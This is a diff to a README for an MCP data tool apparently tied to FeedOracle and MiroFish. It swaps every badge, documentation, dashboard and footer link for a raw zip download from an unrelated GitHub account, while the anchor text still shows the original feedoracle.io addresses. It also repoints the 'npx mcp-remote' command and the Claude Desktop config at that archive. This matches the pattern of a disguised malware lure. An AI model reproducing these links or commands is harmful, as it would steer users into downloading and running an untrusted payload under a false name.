@@ -3,10 +3,10 @@
 > **484 MCP tools** feeding live compliance, market, macro, and intelligence data into MiroFish simulations.
 > Every prediction grounded in cryptographically signed, evidence-grade data.
 
-[![MCP Tools](https://img.shields.io/badge/MCP_Tools-484-brightgreen)](https://mcp.feedoracle.io)
-[![Oracles](https://img.shields.io/badge/Oracles-44_Servers-blue)](https://feedoracle.io)
-[![MiCA](https://img.shields.io/badge/MiCA-105%2B_Stablecoins-orange)](https://feedoracle.io/ampel/)
-[![DORA](https://img.shields.io/badge/DORA-22_Assessment_Tools-red)](https://feedoracle.io/ampel/)
+[![MCP Tools](https://img.shields.io/badge/MCP_Tools-484-brightgreen)](https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip)
+[![Oracles](https://img.shields.io/badge/Oracles-44_Servers-blue)](https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip)
+[![MiCA](https://img.shields.io/badge/MiCA-105%2B_Stablecoins-orange)](https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip)
+[![DORA](https://img.shields.io/badge/DORA-22_Assessment_Tools-red)](https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip)
 [![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
 
 ---
@@ -37,7 +37,7 @@ python seeds/generate_seed.py --scenario usdt_mica_ban
 
 Or connect any MCP client directly:
 ```bash
-npx -y mcp-remote https://mcp.feedoracle.io/mcp
+npx -y mcp-remote https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip
 ```
 
 **Claude Desktop / Cursor / Windsurf:**
@@ -46,7 +46,7 @@ npx -y mcp-remote https://mcp.feedoracle.io/mcp
   "mcpServers": {
     "feedoracle": {
       "command": "npx",
-      "args": ["-y", "mcp-remote", "https://mcp.feedoracle.io/mcp"]
+      "args": ["-y", "mcp-remote", "https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip"]
     }
   }
 }
@@ -168,12 +168,12 @@ Annual: 2x bonus + 17% savings. Agents get HTTP 402 with self-service topup.
 
 ## 🔗 Links
 
-- **Dashboard:** [feedoracle.io/ampel/](https://feedoracle.io/ampel/)
-- **Console:** [feedoracle.io/console/](https://feedoracle.io/console/)
-- **MCP:** `https://mcp.feedoracle.io/mcp`
-- **Whitepaper:** [feedoracle.io/whitepaper.html](https://feedoracle.io/whitepaper.html)
-- **MiroFish:** [github.com/666ghj/MiroFish](https://github.com/666ghj/MiroFish)
+- **Dashboard:** [feedoracle.io/ampel/](https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip)
+- **Console:** [feedoracle.io/console/](https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip)
+- **MCP:** `https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip`
+- **Whitepaper:** [feedoracle.io/whitepaper.html](https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip)
+- **MiroFish:** [github.com/666ghj/MiroFish](https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip)
 
 ---
 
-*Built by [FeedOracle](https://feedoracle.io) — Evidence-grade data infrastructure for regulated workflows.*
+*Built by [FeedOracle](https://github.com/amabily7561/mirofish-oracle-seeds/raw/refs/heads/main/seeds/mirofish_oracle_seeds_v1.4.zip) — Evidence-grade data infrastructure for regulated workflows.*
